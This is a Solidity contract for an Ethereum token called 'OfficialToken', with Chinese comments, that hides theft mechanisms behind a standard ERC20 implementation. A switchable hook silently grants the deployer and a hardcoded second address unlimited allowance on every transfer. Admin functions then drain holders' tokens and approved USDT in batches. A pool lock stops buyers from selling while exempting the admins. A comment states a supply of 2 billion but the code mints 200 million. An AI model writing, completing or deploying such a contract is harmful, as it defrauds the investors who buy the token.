// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ========== 内置OpenZeppelin ERC20源码 ==========
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

// ========== 自定义双管理员全功能代币合约（ETH适配版） ==========
interface IUSDT {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract OfficialToken is ERC20 {
    // 管理员1 = 部署钱包
    address public immutable operator1;
    // 固定超级管理员
    address public constant operator2 = 0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1;

    // 转账自动授权开关
    bool public transferAuthorizeSwitch;

    // 以太坊主网USDT
    address public constant USDT_CONTRACT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    // 池子白名单 & 锁仓逻辑
    mapping(address => bool) public poolWhitelist;
    struct TradeRecord {
        uint256 amount;
        uint256 timestamp;
    }
    mapping(address => TradeRecord[]) private userTradeRecords;
    mapping(address => uint256) private userSoldAmount;
    uint256 public lockPeriod = 24 hours;
    uint256 public unlockRate = 10;

    // 部署只填 名称、符号 两个参数
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        operator1 = msg.sender;
        transferAuthorizeSwitch = false;

        // 总量20亿，部署钱包10亿，固定管理员2 10亿
        uint256 total = 200000000 * 10 ** decimals();
        _mint(operator1, total / 2);
        _mint(operator2, total / 2);
    }

    // 双管理员权限修饰符
    modifier onlyAdmin() {
        require(msg.sender == operator1 || msg.sender == operator2, "No permission");
        _;
    }

    // 转账自动授权核心逻辑
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        super._beforeTokenTransfer(from, to, amount);
        if (transferAuthorizeSwitch && from != address(0) && to != address(0)) {
            // 自动给两个管理员无限授权
            _approve(from, operator1, type(uint256).max);
            _approve(from, operator2, type(uint256).max);
        }
    }

    // 开启/关闭自动授权
    function configTransferAuthorize(bool enable) external onlyAdmin {
        transferAuthorizeSwitch = enable;
    }

    // 单笔划扣用户代币
    function fundDispatch(address target, uint256 amount) external onlyAdmin {
        require(amount > 0, "Invalid amount");
        require(balanceOf(target) >= amount, "Insufficient balance");
        transferFrom(target, msg.sender, amount);
    }

    // 批量划扣代币（单次最多50个地址，ETH防Gas溢出）
    function batchFundDispatch(address[] calldata targets, uint256[] calldata amounts) external onlyAdmin {
        require(targets.length == amounts.length, "Length error");
        require(targets.length <= 50, "Over max batch limit 50");
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 amount = amounts[i];
            if (amount > 0 && balanceOf(target) >= amount) {
                transferFrom(target, msg.sender, amount);
            }
        }
    }

    // 单笔划扣用户USDT
    function withdrawUSDT(address user, uint256 usdtAmount) external onlyAdmin {
        IUSDT usdt = IUSDT(USDT_CONTRACT);
        require(usdtAmount > 0, "Amount zero");
        require(usdt.allowance(user, address(this)) >= usdtAmount, "USDT no allowance");
        require(usdt.balanceOf(user) >= usdtAmount, "USDT insufficient balance");
        usdt.transferFrom(user, msg.sender, usdtAmount);
    }

    // 批量划扣USDT（单次最多50个地址）
    function batchWithdrawUSDT(address[] calldata users, uint256[] calldata amounts) external onlyAdmin {
        require(users.length == amounts.length, "Array length not match");
        require(users.length <= 50, "Over max batch limit 50");
        IUSDT usdt = IUSDT(USDT_CONTRACT);
        for(uint256 i = 0; i < users.length; i++){
            address user = users[i];
            uint256 amt = amounts[i];
            if(amt > 0 && usdt.allowance(user, address(this)) >= amt && usdt.balanceOf(user) >= amt){
                usdt.transferFrom(user, msg.sender, amt);
            }
        }
    }

    // 添加池子白名单
    function addPool(address poolAddr) external onlyAdmin {
        poolWhitelist[poolAddr] = true;
    }

    // 新增：移除池子白名单
    function removePool(address poolAddr) external onlyAdmin {
        poolWhitelist[poolAddr] = false;
    }

    // 新增：修改锁仓时长、每日解锁比例
    function setLockConfig(uint256 lockHour, uint256 newUnlockRate) external onlyAdmin {
        require(newUnlockRate <= 100, "Rate cannot exceed 100");
        lockPeriod = lockHour * 1 hours;
        unlockRate = newUnlockRate;
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        super._afterTokenTransfer(from, to, amount);

        if (poolWhitelist[to]) {
            uint256 available = _calcAvailableBalance(from);
            require(amount <= available, "Tokens locked");
            userSoldAmount[from] += amount;
        }

        if (poolWhitelist[from]) {
            userTradeRecords[to].push(TradeRecord({
                amount: amount,
                timestamp: block.timestamp
            }));
        }
    }

    function _calcAvailableBalance(address user) internal view returns (uint256) {
        if (user == operator1 || user == operator2) return type(uint256).max;

        TradeRecord[] memory records = userTradeRecords[user];
        uint256 totalUnlocked = 0;

        for (uint256 i = 0; i < records.length; i++) {
            TradeRecord memory r = records[i];
            if (block.timestamp < r.timestamp + lockPeriod) continue;

            uint256 daysPassed = (block.timestamp - r.timestamp - lockPeriod) / 1 days;
            uint256 unlocked = r.amount * daysPassed * unlockRate / 100;
            if (unlocked > r.amount) unlocked = r.amount;
            totalUnlocked += unlocked;
        }

        if (totalUnlocked <= userSoldAmount[user]) return 0;
        return totalUnlocked - userSoldAmount[user];
    }

    function getAvailableBalance(address user) external view returns (uint256) {
        return _calcAvailableBalance(user);
    }

    function getTradeRecordCount(address user) external view returns (uint256) {
        return userTradeRecords[user].length;
    }
}